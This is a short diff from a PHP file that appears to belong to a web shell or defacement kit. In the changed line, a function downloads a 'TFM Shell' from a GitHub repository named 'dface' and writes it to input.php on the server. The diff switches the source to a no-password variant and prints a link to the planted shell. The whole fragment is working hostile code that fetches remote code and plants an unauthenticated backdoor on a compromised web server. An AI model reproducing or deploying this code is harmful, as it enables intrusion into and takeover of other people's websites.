@@ -639,7 +639,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['lockfile'])) {
 	if(file_exists('input.php')) {
 		echo "<gr><a style='color:white;text-decoration:none;' href=$full/input.php target='_blank'>Click Here</a></gr></center>";
 	} else {
-		if(tfm("https://raw.githubusercontent.com/vlain1337/dface/refs/heads/main/tahi/tfm-globals.txt","input.php")) {
+		if(tfm("https://raw.githubusercontent.com/vlain1337/dface/main/me/tfm-no-pass.txt","input.php")) {
 			echo "<gr><a style='color:white;text-decoration:none;' href=$full/input.php target='_blank'>Click Here</a></gr></center>";
 		} else {
 			echo "<rd>Failed to spawn TFM Shell</rd>";}
